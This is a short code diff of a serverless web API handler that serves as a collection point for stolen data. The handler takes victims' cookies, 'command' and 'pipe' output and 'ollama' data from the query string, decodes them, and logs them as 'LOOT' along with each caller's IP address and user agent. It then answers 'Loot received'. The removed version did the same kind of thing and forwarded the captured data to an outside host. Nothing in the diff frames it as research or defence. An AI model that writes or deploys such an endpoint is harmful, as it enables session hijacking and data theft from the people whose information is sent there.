@@ -1,20 +1,14 @@
 export default async function handler(req, res) {
-  const { type, data, ua, url } = req.query;
+  const { cookies, command, pipe, ollama, timestamp } = req.query;
   
-  // Log to Vercel logs + file
-  console.log(`[${new Date().toISOString()}] ${req.headers['x-forwarded-for'] || req.connection.remoteAddress} | ${type} | ${ua.slice(0,50)}`);
-  
-  // Persist to Vercel KV (or external DB)
-  await fetch('https://httpbin.org/post', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      ip: req.headers['x-forwarded-for'],
-      type, data: decodeURIComponent(data), 
-      userAgent: ua,
-      timestamp: new Date().toISOString()
-    })
+  console.log('🦠 LOOT:', new Date().toISOString(), {
+    cookies: decodeURIComponent(cookies || ''),
+    command: decodeURIComponent(command || ''),
+    pipe: decodeURIComponent(pipe || ''),
+    ollama: decodeURIComponent(ollama || ''),
+    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
+    ua: req.headers['user-agent']
   });
   
-  res.status(200).json({ status: 'LOOTED', type, received: true });
+  res.status(200).json({ status: 'Loot received', data: req.query });
 }
